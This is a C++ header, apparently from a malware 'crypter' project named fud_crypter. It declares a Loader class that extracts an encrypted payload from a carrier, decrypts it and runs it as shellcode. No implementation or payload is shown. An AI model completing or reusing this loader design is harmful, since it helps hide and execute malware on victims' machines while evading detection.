#pragma once
#include "fud_crypter/config.hpp"
#include "fud_crypter/logging/logger.hpp"
#include "fud_crypter/memory/executable_memory.hpp"
#include <memory>

namespace fud_crypter {

    class Loader {
    public:
        explicit Loader(const LoaderConfig& config);
        bool execute(); // Futtatás

    private:
        std::vector<uint8_t> extract_payload(const std::string& carrier);
        std::vector<uint8_t> decrypt_payload(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key);
        void run_shellcode(const std::vector<uint8_t>& shellcode);

        LoaderConfig config_;
        std::shared_ptr<Logger> logger_;
    };

} // namespace fud_crypter
